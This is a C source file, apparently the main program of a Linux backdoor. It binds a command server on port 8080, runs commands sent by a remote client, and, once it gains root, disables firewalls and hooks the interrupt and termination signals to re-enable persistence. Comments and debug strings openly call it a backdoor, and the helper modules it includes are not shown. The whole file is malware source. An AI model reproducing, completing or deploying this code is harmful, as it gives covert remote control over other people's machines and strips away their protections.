#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include "debug.h"
#include "comms.h"
#include "cmd.h"
#include "security.h"

#define PORT 8080

// Installs the signal handlers that makes sure persistence is still enabled
// if this program receives a SIGINT or something.
void sig_install() {
    struct sigaction action;
    sigemptyset(&(action.sa_mask));
    action.sa_flags = 0;
    action.sa_handler = enable_persistence;
    sigaddset(&(action.sa_mask), SIGINT);
    sigaddset(&(action.sa_mask), SIGTERM);
    sigaddset(&(action.sa_mask), SIGTSTP);
    sigaction(SIGINT, &action, NULL);
    sigaction(SIGTERM, &action, NULL);
    sigaction(SIGTSTP, &action, NULL);
}

// Communicates with the client and listens for commands.
// Returns 1 if the client uses the "quit" or "exit" command.
// Returns 0 if the client uses the uninstall command.
char communicate() {
    char *cmd; // Contains the command that the client sent
    char ret = 1; // Return value

    // Loop until the client no longer wants to send commands
    debug_print("Connected to client.\n");
    do {
        // Read and process the command sent
        cmd = get_cmd();
        if(cmd == NULL) {
            break;
        }
        process_cmd(cmd);
        ret = !!strncmp(cmd, "uninstall", 9);
    } while(check_exit(cmd));

    return ret;
}

// Sets up the server socket and returns the server's file descriptor
int setup_server() {
    struct sockaddr_in addr; // Contains client socket information
    int addrlen; // Size of addr
    int server_fd; // Server's file descriptor
    int option; // Used for setsockopt()

    // Create the socket
    debug_print("Creating socket...\n");
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(server_fd < 0) {
        debug_err("Error in socket()");
        exit(1);
    }

    // Modify the options so that we can forcefully bind to the socket even if it's in use
    option = 1;
    if(setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &option, sizeof(option)) == -1) {
        debug_err("Error in setsockopt()");
        exit(1);
    }

    // Bind to the socket
    debug_print("Binding to socket on port %d...\n", PORT);
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);
    addrlen = sizeof(addr);
    if(bind(server_fd, (const struct sockaddr *) &addr, addrlen) < 0) {
        debug_err("Error in bind()");
        exit(1);
    }

    // Mark this socket as a passive socket
    if(listen(server_fd, 1) < 0) {
        debug_err("Error in listen()");
        exit(1);
    }

    return server_fd;
}

// Main function
int main(int argc, char **argv) {
    struct sockaddr client_addr; // Contains client socket information
    socklen_t client_addr_len; // Size of client_addr
    int server_fd; // Descriptor for the server socket to bind to
    int fd; // The client socket that we will read/write to
    char running; // Set to zero when the server stops running

    // If we can become root, then enable the signal handler (which
    // guarantees persistence) and disable firewalls.
    if(setuid(0) != -1) {
        sig_install();
        disable_firewalls();
    } else {
        debug_print("Warning: This program is running with non-root privileges.\n");
        debug_print("This means that firewalls won\'t be disabled and persistence won\'t be enabled.\n");
    }

    // Setup the server
    server_fd = setup_server();

    // Continuously listen for connections, and then communicate with the client
    running = 1;
    while(running) {
        debug_print("Listening...\n");
        fd = accept(server_fd, &client_addr, &client_addr_len);
        if(fd < 0) {
            debug_err("Error in accept()");
            exit(1);
        }
        comms_fd(fd); // Set the file descriptor used for communication
        running = communicate();
        close(fd);
        debug_print("Client ended connection...\n");
    }

    // Stop the server
    debug_print("Stopping server and uninstalling backdoor...\n");
    uninstall_backdoor();
    close(server_fd);

    return 0;
}
